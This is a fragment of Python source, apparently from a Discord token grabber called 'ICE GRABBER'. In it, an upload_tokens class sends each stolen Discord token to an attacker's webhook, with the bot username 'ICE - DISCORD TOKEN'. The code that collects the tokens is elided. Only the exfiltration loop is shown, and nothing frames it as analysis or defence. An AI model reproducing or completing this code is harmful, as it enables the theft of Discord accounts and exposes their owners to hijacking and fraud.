...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="ICE GRABBER ON TOP!")

            self.webhook.send(embed=embed, username="ICE - DISCORD TOKEN",
                              avatar_url="https://media.discordapp.net/attachments/1156313100518170644/1165368332086685897/a_37e3a7f6059f25886adf5e1e00e3d13b.gif?ex=654698d5&is=653423d5&hm=c0b35e460b40c110fadc95a07503b96573bc634877832193260112ff64a24664&=")
